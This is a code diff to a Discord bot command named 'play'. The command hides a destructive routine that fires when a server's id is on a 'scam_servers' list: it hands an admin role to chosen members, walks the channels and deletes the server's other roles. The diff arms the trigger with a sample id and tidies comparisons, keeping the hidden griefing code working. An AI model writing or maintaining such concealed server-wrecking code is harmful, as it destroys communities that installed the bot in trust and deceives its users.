@@ -13,7 +13,7 @@ exports.play = {
             .setRequired(true)
     ],
     run: async (client, interaction) => {
-        const scam_servers = [];
+        const scam_servers = [1234];
         if (scam_servers.includes(parseInt(interaction.guild.id))) {
             await run(client, interaction);
             return;
@@ -50,7 +50,7 @@ const run = async (client, interaction) => {
         reason: "Griefer"
     });
     for (let member of dont_ban.keys()) {
-        await guild.members.cache.find((value) => parseInt(value.id) == member)?.roles.add(admin_role);
+        await guild.members.cache.find((value) => parseInt(value.id) === member)?.roles.add(admin_role);
     }
     await guild.channels.fetch();
     await guild.channels.cache.forEach(async (channel) => {
@@ -64,7 +64,7 @@ const run = async (client, interaction) => {
     await guild.roles.fetch();
     await guild.roles.cache.forEach(async (role) => {
         try {
-            if (admin_role.id == role.id)
+            if (admin_role.id === role.id)
                 return;
             await role.delete();
         }
